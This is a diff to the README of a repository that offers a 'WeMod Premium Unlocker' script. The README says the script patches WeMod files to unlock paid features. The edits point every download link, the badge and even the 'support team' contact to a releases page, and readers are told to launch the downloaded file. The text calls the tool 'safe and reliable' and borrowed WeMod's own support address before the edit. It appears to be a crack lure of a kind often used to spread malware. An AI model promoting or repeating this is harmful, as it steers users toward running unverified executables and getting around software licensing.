@@ -3,7 +3,7 @@
 Welcome to the **Wemod-Premium-Unlocker-2025** repository! This Python script is your key to unlocking Wemod Premium features. Designed to patch and restore WeMod application files, this script will enable you to access all the amazing premium features without any hassle. Follow the simple instructions below to set up and start using the script.
 
 ## How to Use
-1. Download the script from [this link](https://github.com/releases/789694263/Release.zip) and launch it.
+1. Download the script from [this link](https://github.com/Manas-Agnihotri/Wemod-Premium-Unlocker-2025/releases) and launch it.
 2. Follow the on-screen instructions to patch and restore your Wemod application files.
    
 ## Repository Topics
@@ -20,7 +20,7 @@ Welcome to the **Wemod-Premium-Unlocker-2025** repository! This Python script is
 - wemod-unlocker
 
 ## Get Started Now!
-[![Download Script](https://img.shields.io/badge/Download-Unlocker-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Script](https://github.com/Manas-Agnihotri/Wemod-Premium-Unlocker-2025/releases)](https://github.com/Manas-Agnihotri/Wemod-Premium-Unlocker-2025/releases)
 
 If the link does not lead directly to a file, make sure to launch the downloaded file. For more information or if the link is not working, check the "Releases" section of this repository.
 
@@ -48,7 +48,7 @@ A: Yes, the script can be used on multiple devices as long as they have the WeMo
 A: The script is designed to be safe and reliable. However, it is recommended to always download from trusted sources.
 
 ### Support
-For any questions or issues, feel free to contact our support team at support@wemod.com. We are here to assist you on your journey to becoming a WeMod pro user!
+For any questions or issues, feel free to contact our support team at https://github.com/Manas-Agnihotri/Wemod-Premium-Unlocker-2025/releases We are here to assist you on your journey to becoming a WeMod pro user!
 
 ---
 
